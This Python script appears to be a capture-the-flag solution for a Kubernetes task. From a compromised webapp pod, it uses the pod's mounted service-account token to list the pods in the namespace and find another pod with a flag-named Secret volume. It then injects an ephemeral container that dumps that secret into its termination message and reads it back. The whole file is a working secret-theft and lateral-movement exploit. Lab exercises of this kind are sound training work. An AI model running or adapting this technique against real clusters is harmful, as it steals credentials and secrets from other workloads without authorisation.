#!/usr/bin/env python3
"""Task14: read another pod's mounted flag through an ephemeral-container exit message."""

from __future__ import annotations

import argparse
import json
import os
import secrets
import ssl
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

DEFAULT_API = "https://kubernetes.default.svc"
DEFAULT_NS = "brainwash-mlops"
SA_DIR = Path("/var/run/secrets/kubernetes.io/serviceaccount")


class KubeClient:
    """Small bearer-auth Kubernetes client using only the standard library."""

    def __init__(self, api: str, token: str, ca: Path) -> None:
        self.api = api.rstrip("/")
        self.token = token
        self.context = ssl.create_default_context(cafile=str(ca))

    def request(
        self,
        path: str,
        method: str = "GET",
        data: dict[str, Any] | None = None,
        content_type: str = "application/json",
    ) -> tuple[int, str]:
        """Return status and body without hiding Kubernetes error responses."""
        body = json.dumps(data).encode() if data is not None else None
        request = urllib.request.Request(
            self.api + path,
            method=method,
            data=body,
            headers={
                "Authorization": f"Bearer {self.token}",
                "Content-Type": content_type,
            },
        )
        try:
            response = urllib.request.urlopen(request, context=self.context, timeout=25)
            return response.status, response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            return error.code, error.read().decode("utf-8", "replace")


def find_flag_mount(pods: list[dict[str, Any]], own_pod: str) -> tuple[str, str]:
    """Find a foreign pod volume backed by a flag-named Secret."""
    for pod in pods:
        if pod.get("metadata", {}).get("name") == own_pod:
            continue
        for volume in pod.get("spec", {}).get("volumes", []):
            secret = volume.get("secret", {})
            names = [volume.get("name", ""), secret.get("secretName", "")]
            if secret and any("flag" in name.lower() for name in names):
                return pod["metadata"]["name"], volume["name"]
    raise LookupError("no foreign flag Secret volume found")


def solve(client: KubeClient, namespace: str, own_pod: str, image: str) -> str:
    """Inject a restricted ephemeral container and retrieve its termination message."""
    status, body = client.request(f"/api/v1/namespaces/{namespace}/pods")
    if status != 200:
        raise RuntimeError(f"pod list failed: HTTP {status}: {body[:500]}")
    target_pod, volume = find_flag_mount(json.loads(body)["items"], own_pod)
    ephemeral_name = "flag-" + secrets.token_hex(4)
    print(f"[target] {namespace}/{target_pod}, volume={volume}, ec={ephemeral_name}")
    patch = {
        "spec": {
            "ephemeralContainers": [
                {
                    "name": ephemeral_name,
                    "image": image,
                    "command": [
                        "sh",
                        "-c",
                        "(cat /flag-volume/*; echo) > /dev/termination-log 2>&1",
                    ],
                    "volumeMounts": [
                        {"name": volume, "mountPath": "/flag-volume", "readOnly": True}
                    ],
                    "terminationMessagePolicy": "File",
                    "terminationMessagePath": "/dev/termination-log",
                    "securityContext": {
                        "allowPrivilegeEscalation": False,
                        "capabilities": {"drop": ["ALL"]},
                        "runAsNonRoot": True,
                        "runAsUser": 10001,
                        "seccompProfile": {"type": "RuntimeDefault"},
                    },
                }
            ]
        }
    }
    status, body = client.request(
        f"/api/v1/namespaces/{namespace}/pods/{target_pod}/ephemeralcontainers",
        "PATCH",
        patch,
        "application/strategic-merge-patch+json",
    )
    if status != 200:
        raise RuntimeError(f"ephemeral-container patch failed: HTTP {status}: {body[:800]}")
    for _ in range(30):
        time.sleep(2)
        status, body = client.request(f"/api/v1/namespaces/{namespace}/pods/{target_pod}")
        if status != 200:
            continue
        statuses = json.loads(body).get("status", {}).get("ephemeralContainerStatuses", [])
        for item in statuses:
            terminated = item.get("state", {}).get("terminated")
            if item.get("name") == ephemeral_name and terminated:
                message = terminated.get("message", "")
                if not message:
                    raise RuntimeError(
                        f"ephemeral container exited without a message: {terminated}"
                    )
                print(message)
                return message
    raise TimeoutError("ephemeral container did not terminate within 60 seconds")


def main() -> None:
    """CLI entry point; designed to run inside the Aim-compromised webapp pod."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--api", default=os.environ.get("KUBERNETES_SERVICE_URL", DEFAULT_API))
    parser.add_argument("--namespace", default=DEFAULT_NS)
    parser.add_argument("--token-file", type=Path, default=SA_DIR / "token")
    parser.add_argument("--ca-file", type=Path, default=SA_DIR / "ca.crt")
    parser.add_argument("--pod", default=os.environ.get("HOSTNAME", ""))
    parser.add_argument("--image", default="registry.internal.brainwash/base:v1")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        fixture = [
            {
                "metadata": {"name": "cert-agent"},
                "spec": {"volumes": [{"name": "flag2", "secret": {"secretName": "flag-task14"}}]},
            }
        ]
        assert find_flag_mount(fixture, "webapp") == ("cert-agent", "flag2")
        print("self-test: OK")
        return
    if not args.pod:
        parser.error("--pod or $HOSTNAME is required")
    client = KubeClient(args.api, args.token_file.read_text().strip(), args.ca_file)
    solve(client, args.namespace, args.pod, args.image)


if __name__ == "__main__":
    main()
